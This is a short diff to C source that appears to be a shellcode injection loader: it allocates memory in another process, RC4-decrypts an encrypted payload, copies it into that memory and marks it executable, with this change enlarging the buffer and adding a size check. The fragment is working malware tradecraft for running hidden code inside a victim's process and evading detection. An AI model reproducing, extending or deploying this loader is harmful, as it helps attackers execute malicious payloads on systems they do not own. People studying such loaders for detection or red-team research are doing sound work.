@@ -260,7 +260,7 @@ int main(int argc, char* argv[]) {
 
 	NTSTATUS ntError;
 
-	size_t sz = 128;
+	size_t sz = 0x18E00;
 	LPVOID rBuffer = NULL;
 	ntError = NtAllocateVirtualMemoryEx(hProcess, &rBuffer, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, NULL, 0);
 	if (ntError != STATUS_SUCCESS) {
@@ -275,7 +275,13 @@ int main(int argc, char* argv[]) {
 	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
 	jodRC4(&shellBuff, &Key);
 
-	memcpy_s(rBuffer, sz, cipher.data, cipher.size);
+	if (sz > cipher.size) {
+		memcpy_s(rBuffer, sz, cipher.data, cipher.size);
+	}
+	else {
+		error("Shellcode needs more space: 0x%p", cipher.size);
+		yolo();
+	}
 
 	ULONG old;
 	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
